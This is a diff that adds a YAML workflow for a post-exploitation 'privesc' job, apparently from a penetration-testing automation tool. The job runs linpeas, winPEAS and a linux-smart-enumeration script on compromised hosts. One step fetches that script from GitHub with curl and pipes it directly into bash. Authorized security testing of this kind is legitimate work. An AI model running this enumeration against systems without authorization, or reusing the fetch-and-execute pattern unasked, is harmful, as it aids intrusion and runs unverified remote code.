@@ -1,0 +1,48 @@
+name: privesc
+description: Privilege escalation — enumerate escalation vectors on compromised Linux
+  and Windows hosts.
+tags:
+- post
+- privesc
+- linux
+- windows
+- enumeration
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Target host or SSH connection string
+      alias: t
+    os_type:
+      type: string
+      default: linux
+      description: 'Target OS: linux, windows'
+    log_command:
+      type: string
+      default: 'true'
+      description: Enable command logging
+jobs:
+  linux-privesc:
+    name: Linux Privilege Escalation
+    run_if: '{{ inputs.os_type == ''linux'' }}'
+    steps:
+    - name: linpeas
+      run: linpeas.sh -a 2>&1 | tee {{ env.OFX_RUN_DIR }}/linpeas_results.txt
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+      timeout: 120
+    - name: linux-smart
+      run: curl -sL https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
+        | bash 2>&1 | tee {{ env.OFX_RUN_DIR }}/lse_results.txt
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+  windows-privesc:
+    name: Windows Privilege Escalation
+    run_if: '{{ inputs.os_type == ''windows'' }}'
+    steps:
+    - name: winpeas
+      run: winPEASx64.exe 2>&1 | tee {{ env.OFX_RUN_DIR }}/winpeas_results.txt
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+      timeout: 120
